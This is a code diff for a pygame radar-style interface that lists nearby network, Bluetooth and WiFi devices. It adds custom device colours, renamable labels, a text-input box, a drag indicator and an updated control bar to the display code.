+        hint2 = self.font_tiny.render("[F3]Color [F4]CTag [Shift+Drag]Move", True, (0, 50, 0))
+        self.screen.blit(hint1, (panel_x + 12, panel_y + panel_h - 26))
+        self.screen.blit(hint2, (panel_x + 12, panel_y + panel_h - 14))
+
+    def _draw_text_input(self):
+        overlay = pygame.Surface((SCREEN_W, SCREEN_H), pygame.SRCALPHA)
+        overlay.fill((0, 0, 0, 140))
+        self.screen.blit(overlay, (0, 0))
+
+        box_w, box_h = 400, 80
+        box_x = SCREEN_W // 2 - box_w // 2
+        box_y = SCREEN_H // 2 - box_h // 2
+
+        draw_panel(self.screen, box_x, box_y, box_w, box_h, border_color=BRIGHT_GREEN)
+
+        prompt = self.font_med.render(self.text_input_prompt, True, BRIGHT_GREEN)
+        self.screen.blit(prompt, (box_x + 15, box_y + 12))
+
+        cursor = "_" if int(time.time() * 3) % 2 == 0 else ""
+        input_text = self.font_hud.render(self.text_input_buffer + cursor, True, WHITE)
+        self.screen.blit(input_text, (box_x + 15, box_y + 38))
+
+        hint = self.font_tiny.render("[ENTER] Confirm   [ESC] Cancel", True, DIM_GREEN)
+        self.screen.blit(hint, (box_x + 15, box_y + 62))
+
+    def _draw_drag_indicator(self):
+        mouse_pos = pygame.mouse.get_pos()
+        drag_surf = pygame.Surface((SCREEN_W, SCREEN_H), pygame.SRCALPHA)
+        pygame.draw.line(drag_surf, (255, 255, 0, 100), RADAR_CENTER, mouse_pos, 1)
+        self.screen.blit(drag_surf, (0, 0))
+        label = self.font_tiny.render("DRAG TO MOVE", True, YELLOW)
+        self.screen.blit(label, (mouse_pos[0] + 10, mouse_pos[1] - 10))
 
     def _draw_hud(self):
         elapsed = time.time() - self.start_time
@@ -1861,8 +2342,8 @@ class UAVRadar:
         panel_y = 148
         panel_w = 285
 
-        net_devices = [d for m, d in self.scanner.devices.items() if m not in self.hidden_devices]
-        net_visible = net_devices[:10]
+        net_items = [(m, d) for m, d in self.scanner.devices.items() if m not in self.hidden_devices]
+        net_visible = net_items[:10]
 
         if net_visible:
             panel_h = 28 + len(net_visible) * 20
@@ -1873,29 +2354,31 @@ class UAVRadar:
             pygame.draw.line(self.screen, PANEL_BORDER, (panel_x + 8, panel_y + 22),
                              (panel_x + panel_w - 8, panel_y + 22), 1)
 
-            for i, dev in enumerate(net_visible):
+            for i, (mac, dev) in enumerate(net_visible):
                 y = panel_y + 26 + i * 20
+                custom_c = self.device_colors.get(mac)
                 if dev.is_self:
-                    color, tag = AMBER, " [YOU]"
+                    color, tag = custom_c or AMBER, " [YOU]"
                 else:
                     vendor = dev.vendor
-                    color = GREEN
+                    color = custom_c or GREEN
                     tag = f" [{vendor[:6]}]" if vendor else ""
-                name = dev.hostname[:12] if dev.hostname else "unknown"
+                default_name = dev.hostname[:12] if dev.hostname else "unknown"
+                name = self._get_display_name(mac, default_name)
                 text = f"{dev.ip:15s} {name}{tag}"
                 line = self.font_small.render(text, True, color)
                 self.screen.blit(line, (panel_x + 10, y))
 
-            if len(net_devices) > 10:
-                more = self.font_tiny.render(f"+{len(net_devices) - 10} more", True, DIM_GREEN)
+            if len(net_items) > 10:
+                more = self.font_tiny.render(f"+{len(net_items) - 10} more", True, DIM_GREEN)
                 self.screen.blit(more, (panel_x + 10, panel_y + panel_h - 14))
             panel_y += panel_h + 6
         else:
             panel_h = 0
 
         if self.show_bt:
-            bt_devs = [d for a, d in self.bt_scanner.devices.items() if a not in self.hidden_devices]
-            bt_vis = bt_devs[:8]
+            bt_items = [(a, d) for a, d in self.bt_scanner.devices.items() if a not in self.hidden_devices]
+            bt_vis = bt_items[:8]
             if bt_vis:
                 bt_h = 28 + len(bt_vis) * 20
                 draw_panel(self.screen, panel_x, panel_y, panel_w, bt_h, border_color=DIM_CYAN)
@@ -1905,28 +2388,30 @@ class UAVRadar:
                 pygame.draw.line(self.screen, DIM_CYAN, (panel_x + 8, panel_y + 22),
                                  (panel_x + panel_w - 8, panel_y + 22), 1)
 
-                for i, dev in enumerate(bt_vis):
+                for i, (addr, dev) in enumerate(bt_vis):
                     y = panel_y + 26 + i * 20
+                    custom_c = self.device_colors.get(addr)
                     if dev.has_airdrop:
-                        color, tag = APPLE_BLUE, " [AD]"
+                        color, tag = custom_c or APPLE_BLUE, " [AD]"
                     elif dev.is_apple:
-                        color, tag = CYAN, " [" + dev.apple_services[0][:5] + "]"
+                        color, tag = custom_c or CYAN, " [" + dev.apple_services[0][:5] + "]"
                     else:
-                        color, tag = DIM_CYAN, ""
-                    name = dev.display_name[:12]
+                        color, tag = custom_c or DIM_CYAN, ""
+                    default_name = dev.display_name[:12]
+                    name = self._get_display_name(addr, default_name)
                     rssi_str = f"{dev.rssi}dB" if dev.rssi else ""
                     text = f"{name:12s} {rssi_str:>6s}{tag}"
                     line = self.font_small.render(text, True, color)
                     self.screen.blit(line, (panel_x + 10, y))
 
-                if len(bt_devs) > 8:
-                    more = self.font_tiny.render(f"+{len(bt_devs) - 8} more", True, DIM_CYAN)
+                if len(bt_items) > 8:
+                    more = self.font_tiny.render(f"+{len(bt_items) - 8} more", True, DIM_CYAN)
                     self.screen.blit(more, (panel_x + 10, panel_y + bt_h - 14))
                 panel_y += bt_h + 6
 
         if self.show_wifi:
-            wifi_nets = [n for b, n in self.wifi_scanner.networks.items() if b not in self.hidden_devices]
-            wifi_vis = wifi_nets[:6]
+            wifi_items = [(b, n) for b, n in self.wifi_scanner.networks.items() if b not in self.hidden_devices]
+            wifi_vis = wifi_items[:6]
             if wifi_vis:
                 wifi_h = 28 + len(wifi_vis) * 20
                 draw_panel(self.screen, panel_x, panel_y, panel_w, wifi_h, border_color=DIM_PURPLE)
@@ -1936,23 +2421,25 @@ class UAVRadar:
                 pygame.draw.line(self.screen, DIM_PURPLE, (panel_x + 8, panel_y + 22),
                                  (panel_x + panel_w - 8, panel_y + 22), 1)
 
-                for i, net in enumerate(wifi_vis):
+                for i, (bssid, net) in enumerate(wifi_vis):
                     y = panel_y + 26 + i * 20
+                    custom_c = self.device_colors.get(bssid)
                     if net.is_open:
-                        color, tag = RED, " [OPEN]"
+                        color, tag = custom_c or RED, " [OPEN]"
                     elif net.security_level >= 3:
-                        color, tag = BRIGHT_PURPLE, " [WPA3]"
+                        color, tag = custom_c or BRIGHT_PURPLE, " [WPA3]"
                     elif net.security_level >= 2:
-                        color, tag = PURPLE, " [WPA2]"
+                        color, tag = custom_c or PURPLE, " [WPA2]"
                     else:
-                        color, tag = DIM_PURPLE, " [WPA]"
-                    name = net.display_name[:12]
+                        color, tag = custom_c or DIM_PURPLE, " [WPA]"
+                    default_name = net.display_name[:12]
+                    name = self._get_display_name(bssid, default_name)
                     text = f"{name:12s} {net.signal:>3d}%{tag}"
                     line = self.font_small.render(text, True, color)
                     self.screen.blit(line, (panel_x + 10, y))
 
-                if len(wifi_nets) > 6:
-                    more = self.font_tiny.render(f"+{len(wifi_nets) - 6} more", True, DIM_PURPLE)
+                if len(wifi_items) > 6:
+                    more = self.font_tiny.render(f"+{len(wifi_items) - 6} more", True, DIM_PURPLE)
                     self.screen.blit(more, (panel_x + 10, panel_y + wifi_h - 14))
 
         # ─── BOTTOM BAR ──────────────────────────────────────────────────
@@ -1962,9 +2449,9 @@ class UAVRadar:
         bt_s = "ON" if self.show_bt else "OFF"
         wifi_s = "ON" if self.show_wifi else "OFF"
         hidden = len(self.hidden_devices)
-        hidden_str = f" HID:{hidden}" if hidden > 0 else ""
+        hidden_str = f" H:{hidden}" if hidden > 0 else ""
         controls = self.font_small.render(
-            f"[R]Scan [B]BT:{bt_s} [W]iFi:{wifi_s} [T]ag [X]Del [P]ort [S]ave [U]nhide{hidden_str} [ESC]",
+            f"[R]Scan [B]T:{bt_s} [W]iFi:{wifi_s} [T]ag [X]Del [K]ick [P]ort [S]ave [F2]Name{hidden_str}",
             True, BRIGHT_GREEN,
         )
         self.screen.blit(controls, (22, bar_y + 7))
